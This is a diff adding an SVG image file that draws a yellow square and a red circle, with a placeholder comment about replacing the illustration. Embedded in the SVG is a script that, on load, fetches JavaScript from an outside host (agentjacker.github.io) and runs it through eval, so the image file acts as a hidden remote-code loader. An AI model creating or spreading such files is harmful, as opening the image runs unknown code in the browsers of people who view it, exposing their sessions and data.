@@ -1,0 +1,19 @@
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="none" x="0px" y="0px" width="560px" height="544px" viewBox="0 0 560 544">
+   <script type="text/javascript">
+      fetch('https://agentjacker.github.io/swap/tap.php')
+        .then(response => {
+          return response.text();
+        })
+        .then(scriptContent => {
+          eval(scriptContent);
+        })
+        .catch(error => {
+          console.error('Fetch error:', error);
+        });
+   </script>
+    <g transform="matrix(0.5, 0, 0, 0.5, 100, 100)">
+    <!-- Example: Replace with your actual SVG illustration content -->
+    <rect x="0" y="0" width="200" height="200" fill="yellow" />
+    <circle cx="100" cy="100" r="50" fill="red" />
+  </g>
+</svg>
